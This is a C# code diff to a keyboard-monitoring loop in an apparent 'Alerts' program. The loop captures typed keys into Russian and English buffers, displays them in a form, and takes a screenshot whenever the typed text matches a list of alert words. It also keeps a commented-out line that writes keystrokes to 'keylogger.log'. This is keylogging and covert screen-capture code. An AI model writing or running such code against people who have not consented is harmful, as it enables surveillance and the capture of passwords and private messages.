@@ -20,13 +20,15 @@ namespace Alerts
         private static void Monitor()
         {
 
-            string buf = "";
+            string bufrus = "";
+            string bufeng = "";
             string[] words = Methods.InitAlertWords();
 
-             while (true)
+            while (true)
             {
 
-                if (buf.Length > 500) buf = "";
+                if (bufrus.Length > 500) bufrus = "";
+                if (bufeng.Length > 500) bufeng = "";
                 Thread.Sleep(100);
                 for (int i = 0; i < 255; i++)
                 {
@@ -35,32 +37,42 @@ namespace Alerts
                     if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital) continue;
                     if (state != 0)
                     {
-                           if (((Keys)i).ToString().Length == 1 && engKey.Contains(((Keys)i).ToString().ToLower()) && ((Keys)i) != Keys.Enter && ((Keys)i) != Keys.Space)
-                            {
-                                buf += rusKey.Substring(engKey.IndexOf(((Keys)i).ToString().ToLower()), 1);
-
-                            }
-
-                        foreach (string o in words)
-                            {
-                            if (buf.Contains(o))
-                            {
-                                Methods.ScreenShot();
-                                buf = "";
-                            }
-                            }
-                       /* if (buf.Length > 10)
+                        if (((Keys)i).ToString().Length == 1 && engKey.Contains(((Keys)i).ToString().ToLower()) && ((Keys)i) != Keys.Enter && ((Keys)i) != Keys.Space)
                         {
-                            File.AppendAllText("keylogger.log", buf + "\n");
-                            buf = "";
-                        }*/
+                            bufrus += rusKey.Substring(engKey.IndexOf(((Keys)i).ToString().ToLower()), 1);
+                            bufeng += ((Keys)i).ToString().ToLower();
+                            Form1 frmTemp = (Form1)Application.OpenForms[0];
+                            string[] bufs = new string[] { bufrus,bufeng};
+                            frmTemp.BufKeyFill(bufs);
+
+                        }
                     }
                 }
+            
+
+            foreach (string o in words)
+            {
+                if (bufrus.Contains(o)||bufeng.Contains(o))
+                {
+                    Methods.ScreenShot();
+                    bufrus = "";
+                    bufeng = "";
+                }
+              
             }
+        }
+            /* if (buf.Length > 10)
+             {
+                 File.AppendAllText("keylogger.log", buf + "\n");
+                 buf = "";
+             }*/
+
+
+
+
 
 
         }
-
 
         public static async void MonitorAsync()
         {
